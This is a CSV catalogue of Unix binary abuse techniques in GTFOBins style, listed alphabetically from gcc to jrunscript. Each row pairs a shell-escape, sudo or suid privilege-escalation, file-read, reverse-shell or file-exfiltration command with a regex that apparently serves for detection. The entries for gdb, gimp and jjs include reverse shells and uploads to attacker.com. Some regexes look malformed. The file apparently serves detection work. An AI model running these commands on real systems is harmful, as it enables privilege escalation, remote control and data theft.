Name,Function,ExampleCode,Regex
gcc,sudo,"sudo gcc -wrapper /bin/sh,-s .",(?i)(?:sudo\s+)?(?:\S*/)?gcc\s+.*/bin/sh)
gcloud,shell,"gcloud help
!/bin/sh",(?i)(?:sudo\s+)?(?:\S*/)?gcloud\s+.*/bin/sh)
gcloud,sudo,"sudo gcloud help
!/bin/sh",(?i)(?:sudo\s+)?(?:\S*/)?gcloud\s+.*/bin/sh)
gcore,file-read,gcore $PID,(?i)(?:sudo\s+)?(?:\S*/)?gcore\s+.*)
gcore,sudo,sudo gcore $PID,(?i)(?:sudo\s+)?(?:\S*/)?gcore\s+.*)
gcore,suid,./gcore $PID,(?i)(?:sudo\s+)?(?:\S*/)?gcore\s+.*)
gdb,shell,gdb -nx -ex '!sh' -ex quit,(?i)(?:sudo\s+)?(?:\S*/)?gdb\s+.*)
gdb,reverse-shell,"export RHOST=attacker.com
export RPORT=12345
gdb -nx -ex 'python import sys,socket,os,pty;s=socket.socket()
s.connect((os.getenv(""RHOST""),int(os.getenv(""RPORT""))))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn(""/bin/sh"")' -ex quit","(?i)(?:sudo\s+)?(?:\S*/)?gdb\s+.*getenv\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*getenv\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*/bin/sh.*socket)"
gdb,file-upload,"export URL=http://attacker.com/
export LFILE=file_to_send
gdb -nx -ex 'python import sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
else: import urllib as u, urllib2 as r
r.urlopen(e[""URL""], bytes(u.urlencode({""d"":open(e[""LFILE""]).read()}).encode()))' -ex quit",(?i)(?:sudo\s+)?(?:\S*/)?gdb\s+.*)
gdb,file-upload,"export LPORT=8888
gdb -nx -ex 'python import sys; from os import environ as e
if sys.version_info.major == 3: import http.server as s, socketserver as ss
else: import SimpleHTTPServer as s, SocketServer as ss
ss.TCPServer(("""", int(e[""LPORT""])), s.SimpleHTTPRequestHandler).serve_forever()' -ex quit",(?i)(?:sudo\s+)?(?:\S*/)?gdb\s+.*socket)
gdb,file-download,"export URL=http://attacker.com/file_to_get
export LFILE=file_to_save
gdb -nx -ex 'python import sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r
else: import urllib as r
r.urlretrieve(e[""URL""], e[""LFILE""])' -ex quit",(?i)(?:sudo\s+)?(?:\S*/)?gdb\s+.*)
gdb,file-write,"gdb -nx -ex ""dump value $LFILE \""DATA\"""" -ex quit",(?i)(?:sudo\s+)?(?:\S*/)?gdb\s+.*)
gdb,file-read,"gdb -nx -ex 'python print(open(""file_to_read"").read())' -ex quit",(?i)(?:sudo\s+)?(?:\S*/)?gdb\s+.*)
gdb,library-load,"gdb -nx -ex 'python from ctypes import cdll; cdll.LoadLibrary(""lib.so"")' -ex quit",(?i)(?:sudo\s+)?(?:\S*/)?gdb\s+.*)
gdb,suid,"./gdb -nx -ex 'python import os; os.execl(""/bin/sh"", ""sh"", ""-p"")' -ex quit",(?i)(?:sudo\s+)?(?:\S*/)?gdb\s+.*/bin/sh)
gdb,sudo,sudo gdb -nx -ex '!sh' -ex quit,(?i)(?:sudo\s+)?(?:\S*/)?gdb\s+.*)
gdb,capabilities,./gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit,(?i)(?:sudo\s+)?(?:\S*/)?gdb\s+.*)
gem,shell,"gem open -e ""/bin/sh -c /bin/sh"" rdoc",(?i)(?:sudo\s+)?(?:\S*/)?gem\s*\-e\s*\-c\s+.*/bin/sh)
gem,shell,"gem open rdoc
:!/bin/sh",(?i)(?:sudo\s+)?(?:\S*/)?gem\s+.*/bin/sh)
gem,shell,"echo 'system(""/bin/sh"")' > $TF/x
gem build $TF/x","(?i)(?:sudo\s+)?(?:\S*/)?gem\s+.*(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*/bin/sh)"
gem,shell,"echo 'system(""/bin/sh"")' > $TF/x
gem install --file $TF/x","(?i)(?:sudo\s+)?(?:\S*/)?gem\s+.*(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*/bin/sh)"
gem,sudo,"sudo gem open -e ""/bin/sh -c /bin/sh"" rdoc",(?i)(?:sudo\s+)?(?:\S*/)?gem\s*\-e\s*\-c\s+.*/bin/sh)
genie,shell,genie -c '/bin/sh',(?i)(?:sudo\s+)?(?:\S*/)?genie\s*\-c\s+.*/bin/sh)
genie,suid,./genie -c '/bin/sh',(?i)(?:sudo\s+)?(?:\S*/)?genie\s*\-c\s+.*/bin/sh)
genie,sudo,sudo genie -c '/bin/sh',(?i)(?:sudo\s+)?(?:\S*/)?genie\s*\-c\s+.*/bin/sh)
genisoimage,file-read,"genisoimage -q -o - ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?genisoimage\s*\-q\s*\-o\s+.*)
genisoimage,suid,"./genisoimage -sort ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?genisoimage\s+.*)
genisoimage,sudo,"sudo genisoimage -q -o - ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?genisoimage\s*\-q\s*\-o\s+.*)
ghc,shell,"ghc -e 'System.Process.callCommand ""/bin/sh""'",(?i)(?:sudo\s+)?(?:\S*/)?ghc\s*\-e\s+.*/bin/sh)
ghc,sudo,"sudo ghc -e 'System.Process.callCommand ""/bin/sh""'",(?i)(?:sudo\s+)?(?:\S*/)?ghc\s*\-e\s+.*/bin/sh)
ghci,shell,"ghci
System.Process.callCommand ""/bin/sh""",(?i)(?:sudo\s+)?(?:\S*/)?ghci\s+.*/bin/sh)
ghci,sudo,"sudo ghci
System.Process.callCommand ""/bin/sh""",(?i)(?:sudo\s+)?(?:\S*/)?ghci\s+.*/bin/sh)
gimp,shell,"gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.system(""sh"")'","(?i)(?:sudo\s+)?(?:\S*/)?gimp\s*\-b\s+.*(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\))"
gimp,reverse-shell,"export RHOST=attacker.com
export RPORT=12345
gimp -idf --batch-interpreter=python-fu-eval -b 'import sys,socket,os,pty;s=socket.socket()
s.connect((os.getenv(""RHOST""),int(os.getenv(""RPORT""))))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn(""/bin/sh"")'","(?i)(?:sudo\s+)?(?:\S*/)?gimp\s*\-b\s+.*getenv\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*getenv\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*/bin/sh.*socket)"
gimp,file-upload,"export URL=http://attacker.com/
export LFILE=file_to_send
gimp -idf --batch-interpreter=python-fu-eval -b 'import sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
else: import urllib as u, urllib2 as r
r.urlopen(e[""URL""], bytes(u.urlencode({""d"":open(e[""LFILE""]).read()}).encode()))'",(?i)(?:sudo\s+)?(?:\S*/)?gimp\s*\-b\s+.*)
gimp,file-upload,"export LPORT=8888
gimp -idf --batch-interpreter=python-fu-eval -b 'import sys; from os import environ as e
if sys.version_info.major == 3: import http.server as s, socketserver as ss
else: import SimpleHTTPServer as s, SocketServer as ss
ss.TCPServer(("""", int(e[""LPORT""])), s.SimpleHTTPRequestHandler).serve_forever()'",(?i)(?:sudo\s+)?(?:\S*/)?gimp\s*\-b\s+.*socket)
gimp,file-download,"export URL=http://attacker.com/file_to_get
export LFILE=file_to_save
gimp -idf --batch-interpreter=python-fu-eval -b 'import sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r
else: import urllib as r
r.urlretrieve(e[""URL""], e[""LFILE""])'",(?i)(?:sudo\s+)?(?:\S*/)?gimp\s*\-b\s+.*)
gimp,file-write,"gimp -idf --batch-interpreter=python-fu-eval -b 'open(""file_to_write"", ""wb"").write(""DATA"")'",(?i)(?:sudo\s+)?(?:\S*/)?gimp\s*\-b\s+.*)
gimp,file-read,"gimp -idf --batch-interpreter=python-fu-eval -b 'print(open(""file_to_read"").read())'",(?i)(?:sudo\s+)?(?:\S*/)?gimp\s*\-b\s+.*)
gimp,library-load,"gimp -idf --batch-interpreter=python-fu-eval -b 'from ctypes import cdll; cdll.LoadLibrary(""lib.so"")'",(?i)(?:sudo\s+)?(?:\S*/)?gimp\s*\-b\s+.*)
gimp,suid,"./gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.execl(""/bin/sh"", ""sh"", ""-p"")'",(?i)(?:sudo\s+)?(?:\S*/)?gimp\s*\-b\s+.*/bin/sh)
gimp,sudo,"sudo gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.system(""sh"")'","(?i)(?:sudo\s+)?(?:\S*/)?gimp\s*\-b\s+.*(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\))"
ginsh,shell,"ginsh
!/bin/sh",(?i)(?:sudo\s+)?(?:\S*/)?ginsh\s+.*/bin/sh)
ginsh,limited-suid,"./ginsh
!/bin/sh",(?i)(?:sudo\s+)?(?:\S*/)?ginsh\s+.*/bin/sh)
ginsh,sudo,"sudo ginsh
!/bin/sh",(?i)(?:sudo\s+)?(?:\S*/)?ginsh\s+.*/bin/sh)
git,shell,"PAGER='sh -c ""exec sh 0<&1""' git -p help",(?i)(?:sudo\s+)?(?:\S*/)?git\s*\-c\s*\-p\s+.*)
git,shell,"git help config
!/bin/sh",(?i)(?:sudo\s+)?(?:\S*/)?git\s+.*/bin/sh)
git,shell,"git branch --help config
!/bin/sh",(?i)(?:sudo\s+)?(?:\S*/)?git\s+.*/bin/sh)
git,shell,"git init ""$TF""
echo 'exec /bin/sh 0<&2 1>&2' >""$TF/.git/hooks/pre-commit.sample""
mv ""$TF/.git/hooks/pre-commit.sample"" ""$TF/.git/hooks/pre-commit""
git -C ""$TF"" commit --allow-empty -m x",(?i)(?:sudo\s+)?(?:\S*/)?git\s*\-C\s*\-m\s+.*/bin/sh)
git,shell,"ln -s /bin/sh ""$TF/git-x""
git ""--exec-path=$TF"" x",(?i)(?:sudo\s+)?(?:\S*/)?git\s*\-s\s+.*/bin/sh)
git,file-read,git diff /dev/null $LFILE,(?i)(?:sudo\s+)?(?:\S*/)?git\s+.*)
git,file-write,git apply --unsafe-paths --directory / x.patch,(?i)(?:sudo\s+)?(?:\S*/)?git\s+.*)
git,sudo,"sudo PAGER='sh -c ""exec sh 0<&1""' git -p help",(?i)(?:sudo\s+)?(?:\S*/)?git\s*\-c\s*\-p\s+.*)
git,sudo,"sudo git -p help config
!/bin/sh",(?i)(?:sudo\s+)?(?:\S*/)?git\s*\-p\s+.*/bin/sh)
git,sudo,"sudo git branch --help config
!/bin/sh",(?i)(?:sudo\s+)?(?:\S*/)?git\s+.*/bin/sh)
git,sudo,"git init ""$TF""
echo 'exec /bin/sh 0<&2 1>&2' >""$TF/.git/hooks/pre-commit.sample""
mv ""$TF/.git/hooks/pre-commit.sample"" ""$TF/.git/hooks/pre-commit""
sudo git -C ""$TF"" commit --allow-empty -m x",(?i)(?:sudo\s+)?(?:\S*/)?git\s*\-C\s*\-m\s+.*/bin/sh)
git,sudo,"ln -s /bin/sh ""$TF/git-x""
sudo git ""--exec-path=$TF"" x",(?i)(?:sudo\s+)?(?:\S*/)?git\s*\-s\s+.*/bin/sh)
git,limited-suid,"PAGER='sh -c ""exec sh 0<&1""' ./git -p help",(?i)(?:sudo\s+)?(?:\S*/)?git\s*\-c\s*\-p\s+.*)
grc,shell,grc --pty /bin/sh,(?i)(?:sudo\s+)?(?:\S*/)?grc\s+.*/bin/sh)
grc,sudo,sudo grc --pty /bin/sh,(?i)(?:sudo\s+)?(?:\S*/)?grc\s+.*/bin/sh)
grep,file-read,grep '' $LFILE,(?i)(?:sudo\s+)?(?:\S*/)?grep\s+.*)
grep,suid,./grep '' $LFILE,(?i)(?:sudo\s+)?(?:\S*/)?grep\s+.*)
grep,sudo,sudo grep '' $LFILE,(?i)(?:sudo\s+)?(?:\S*/)?grep\s+.*)
gtester,file-write,"gtester ""DATA"" -o $LFILE",(?i)(?:sudo\s+)?(?:\S*/)?gtester\s*\-o\s+.*)
gtester,shell,"echo '#!/bin/sh' > $TF
echo 'exec /bin/sh -p 0<&1' >> $TF
chmod +x $TF
gtester -q $TF",(?i)(?:sudo\s+)?(?:\S*/)?gtester\s*\-p\s*\-q\s+.*/bin/sh)
gtester,sudo,"echo '#!/bin/sh' > $TF
echo 'exec /bin/sh 0<&1' >> $TF
chmod +x $TF
sudo gtester -q $TF",(?i)(?:sudo\s+)?(?:\S*/)?gtester\s*\-q\s+.*/bin/sh)
gtester,suid,"echo '#!/bin/sh -p' > $TF
echo 'exec /bin/sh -p 0<&1' >> $TF
chmod +x $TF
sudo gtester -q $TF",(?i)(?:sudo\s+)?(?:\S*/)?gtester\s*\-p\s*\-p\s*\-q\s+.*/bin/sh)
gzip,file-read,gzip -f $LFILE -t,(?i)(?:sudo\s+)?(?:\S*/)?gzip\s*\-f\s*\-t\s+.*)
gzip,file-read,gzip -c $LFILE | gzip -d,(?i)(?:sudo\s+)?(?:\S*/)?gzip\s*\-c\s*\-d\s+.*)
gzip,suid,./gzip -f $LFILE -t,(?i)(?:sudo\s+)?(?:\S*/)?gzip\s*\-f\s*\-t\s+.*)
gzip,sudo,sudo gzip -f $LFILE -t,(?i)(?:sudo\s+)?(?:\S*/)?gzip\s*\-f\s*\-t\s+.*)
hd,file-read,"hd ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?hd\s+.*)
hd,suid,"./hd ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?hd\s+.*)
hd,sudo,"sudo hd ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?hd\s+.*)
head,file-read,"head -c1G ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?head\s+.*)
head,suid,"./head -c1G ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?head\s+.*)
head,sudo,"sudo head -c1G ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?head\s+.*)
hexdump,file-read,"hexdump -C ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?hexdump\s*\-C\s+.*)
hexdump,suid,"./hexdump -C ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?hexdump\s*\-C\s+.*)
hexdump,sudo,"sudo hexdump -C ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?hexdump\s*\-C\s+.*)
highlight,file-read,"highlight --no-doc --failsafe ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?highlight\s+.*)
highlight,suid,"./highlight --no-doc --failsafe ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?highlight\s+.*)
highlight,sudo,"sudo highlight --no-doc --failsafe ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?highlight\s+.*)
hping3,shell,"hping3
/bin/sh",(?i)(?:sudo\s+)?(?:\S*/)?hping3\s+.*/bin/sh)
hping3,suid,"./hping3
/bin/sh -p",(?i)(?:sudo\s+)?(?:\S*/)?hping3\s*\-p\s+.*/bin/sh)
hping3,sudo,"sudo hping3
/bin/sh",(?i)(?:sudo\s+)?(?:\S*/)?hping3\s+.*/bin/sh)
hping3,sudo,"sudo hping3 ""$RHOST"" --icmp --data 500 --sign xxx --file ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?hping3\s+.*)
iconv,file-write,"echo ""DATA"" | iconv -f 8859_1 -t 8859_1 -o ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?iconv\s*\-f\s*\-t\s*\-o\s+.*)
iconv,file-read,"iconv -f 8859_1 -t 8859_1 ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?iconv\s*\-f\s*\-t\s+.*)
iconv,suid,"./iconv -f 8859_1 -t 8859_1 ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?iconv\s*\-f\s*\-t\s+.*)
iconv,sudo,"./iconv -f 8859_1 -t 8859_1 ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?iconv\s*\-f\s*\-t\s+.*)
iftop,shell,"iftop
!/bin/sh",(?i)(?:sudo\s+)?(?:\S*/)?iftop\s+.*/bin/sh)
iftop,limited-suid,"./iftop
!/bin/sh",(?i)(?:sudo\s+)?(?:\S*/)?iftop\s+.*/bin/sh)
iftop,sudo,"sudo iftop
!/bin/sh",(?i)(?:sudo\s+)?(?:\S*/)?iftop\s+.*/bin/sh)
install,suid,./install -m 6777 $LFILE $TF,(?i)(?:sudo\s+)?(?:\S*/)?install\s*\-m\s+.*)
install,sudo,sudo install -m 6777 $LFILE $TF,(?i)(?:sudo\s+)?(?:\S*/)?install\s*\-m\s+.*)
ionice,shell,ionice /bin/sh,(?i)(?:sudo\s+)?(?:\S*/)?ionice\s+.*/bin/sh)
ionice,suid,./ionice /bin/sh -p,(?i)(?:sudo\s+)?(?:\S*/)?ionice\s*\-p\s+.*/bin/sh)
ionice,sudo,sudo ionice /bin/sh,(?i)(?:sudo\s+)?(?:\S*/)?ionice\s+.*/bin/sh)
ip,file-read,"ip -force -batch ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?ip\s+.*)
ip,suid,"./ip -force -batch ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?ip\s+.*)
ip,suid,"./ip netns add foo
./ip netns exec foo /bin/sh -p
./ip netns delete foo",(?i)(?:sudo\s+)?(?:\S*/)?ip\s*\-p\s+.*/bin/sh)
ip,sudo,"sudo ip -force -batch ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?ip\s+.*)
ip,sudo,"sudo ip netns add foo
sudo ip netns exec foo /bin/sh
sudo ip netns delete foo",(?i)(?:sudo\s+)?(?:\S*/)?ip\s+.*/bin/sh)
ip,sudo,"sudo ip netns add foo
sudo ip netns exec foo /bin/ln -s /proc/1/ns/net /var/run/netns/bar
sudo ip netns exec bar /bin/sh
sudo ip netns delete foo
sudo ip netns delete bar",(?i)(?:sudo\s+)?(?:\S*/)?ip\s*\-s\s+.*/bin/sh)
irb,shell,"irb
exec '/bin/bash'",(?i)(?:sudo\s+)?(?:\S*/)?irb\s+.*/bin/bash)
irb,reverse-shell,"export RHOST='127.0.0.1'
export RPORT=9000
irb
require 'socket'; exit if fork;c=TCPSocket.new(ENV[""RHOST""],ENV[""RPORT""]);while(cmd=c.gets);IO.popen(cmd,""r""){|io|c.print io.read} end","(?i)(?:sudo\s+)?(?:\S*/)?irb\s+.*(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*socket)"
irb,file-upload,"irb
require 'webrick'; WEBrick::HTTPServer.new(:Port => 8888, :DocumentRoot => Dir.pwd).start;",(?i)(?:sudo\s+)?(?:\S*/)?irb\s+.*)
irb,file-download,"export URL=http://attacker.com/file_to_get
export LFILE=file_to_save
irb
require 'open-uri'; download = open(ENV['URL']); IO.copy_stream(download, ENV['LFILE'])",(?i)(?:sudo\s+)?(?:\S*/)?irb\s+.*)
irb,file-write,"irb
File.open(""file_to_write"", ""w+"") { |f| f.write(""DATA"") }",(?i)(?:sudo\s+)?(?:\S*/)?irb\s+.*)
irb,file-read,"irb
puts File.read(""file_to_read"")",(?i)(?:sudo\s+)?(?:\S*/)?irb\s+.*)
irb,library-load,"irb
require ""fiddle""; Fiddle.dlopen(""lib.so"")",(?i)(?:sudo\s+)?(?:\S*/)?irb\s+.*)
irb,sudo,"sudo irb
exec '/bin/bash'",(?i)(?:sudo\s+)?(?:\S*/)?irb\s+.*/bin/bash)
ispell,shell,"ispell /etc/passwd
!/bin/sh",(?i)(?:sudo\s+)?(?:\S*/)?ispell\s+.*/bin/sh)
ispell,suid,"./ispell /etc/passwd
!/bin/sh -p",(?i)(?:sudo\s+)?(?:\S*/)?ispell\s*\-p\s+.*/bin/sh)
ispell,sudo,"sudo ispell /etc/passwd
!/bin/sh",(?i)(?:sudo\s+)?(?:\S*/)?ispell\s+.*/bin/sh)
jjs,shell,"echo ""Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c \$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)').waitFor()"" | jjs","(?i)(?:sudo\s+)?(?:\S*/)?jjs\s*\-c\s+.*(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*/bin/sh)"
jjs,reverse-shell,"export RHOST=attacker.com
export RPORT=12345
echo 'var host=Java.type(""java.lang.System"").getenv(""RHOST"");
var port=Java.type(""java.lang.System"").getenv(""RPORT"");
var ProcessBuilder = Java.type(""java.lang.ProcessBuilder"");
var p=new ProcessBuilder(""/bin/bash"", ""-i"").redirectErrorStream(true).start();
var Socket = Java.type(""java.net.Socket"");
var s=new Socket(host,port);
var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){ while(pi.available()>0)so.write(pi.read()); while(pe.available()>0)so.write(pe.read()); while(si.available()>0)po.write(si.read()); so.flush();po.flush(); Java.type(""java.lang.Thread"").sleep(50); try {p.exitValue();break;}catch (e){}};p.destroy();s.close();' | jjs","(?i)(?:sudo\s+)?(?:\S*/)?jjs\s+.*getenv\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*getenv\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*/bin/bash.*socket)"
jjs,file-download,"export URL=http://attacker.com/file_to_get
export LFILE=file_to_save
echo ""var URL = Java.type('java.net.URL');
var ws = new URL('$URL');
var Channels = Java.type('java.nio.channels.Channels');
var rbc = Channels.newChannel(ws.openStream());
var FileOutputStream = Java.type('java.io.FileOutputStream');
var fos = new FileOutputStream('$LFILE');
fos.getChannel().transferFrom(rbc, 0, Number.MAX_VALUE);
fos.close();
rbc.close();"" | jjs",(?i)(?:sudo\s+)?(?:\S*/)?jjs\s+.*)
jjs,file-write,"echo 'var FileWriter = Java.type(""java.io.FileWriter"");
var fw=new FileWriter(""./file_to_write"");
fw.write(""DATA"");
fw.close();' | jjs",(?i)(?:sudo\s+)?(?:\S*/)?jjs\s+.*)
jjs,file-read,"echo 'var BufferedReader = Java.type(""java.io.BufferedReader"");
var FileReader = Java.type(""java.io.FileReader"");
var br = new BufferedReader(new FileReader(""file_to_read""));
while ((line = br.readLine()) != null) { print(line); }' | jjs",(?i)(?:sudo\s+)?(?:\S*/)?jjs\s+.*)
jjs,suid,"echo ""Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -pc \$@|sh\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)').waitFor()"" | ./jjs","(?i)(?:sudo\s+)?(?:\S*/)?jjs\s*\-p\s+.*(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*/bin/sh)"
jjs,sudo,"echo ""Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c \$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)').waitFor()"" | sudo jjs","(?i)(?:sudo\s+)?(?:\S*/)?jjs\s*\-c\s+.*(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*/bin/sh)"
joe,shell,"joe
^K!/bin/sh",(?i)(?:sudo\s+)?(?:\S*/)?joe\s+.*/bin/sh)
joe,limited-suid,"./joe
^K!/bin/sh",(?i)(?:sudo\s+)?(?:\S*/)?joe\s+.*/bin/sh)
joe,sudo,"sudo joe
^K!/bin/sh",(?i)(?:sudo\s+)?(?:\S*/)?joe\s+.*/bin/sh)
join,file-read,join -a 2 /dev/null $LFILE,(?i)(?:sudo\s+)?(?:\S*/)?join\s*\-a\s+.*)
join,suid,./join -a 2 /dev/null $LFILE,(?i)(?:sudo\s+)?(?:\S*/)?join\s*\-a\s+.*)
join,sudo,sudo join -a 2 /dev/null $LFILE,(?i)(?:sudo\s+)?(?:\S*/)?join\s*\-a\s+.*)
journalctl,shell,"journalctl
!/bin/sh",(?i)(?:sudo\s+)?(?:\S*/)?journalctl\s+.*/bin/sh)
journalctl,sudo,"sudo journalctl
!/bin/sh",(?i)(?:sudo\s+)?(?:\S*/)?journalctl\s+.*/bin/sh)
jq,file-read,"jq -Rr . ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?jq\s+.*)
jq,suid,"./jq -Rr . ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?jq\s+.*)
jq,sudo,"sudo jq -Rr . ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?jq\s+.*)
jrunscript,shell,"jrunscript -e ""exec('/bin/sh -c \$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)')""","(?i)(?:sudo\s+)?(?:\S*/)?jrunscript\s*\-e\s*\-c\s+.*(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(?:\s*(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*/bin/sh)"
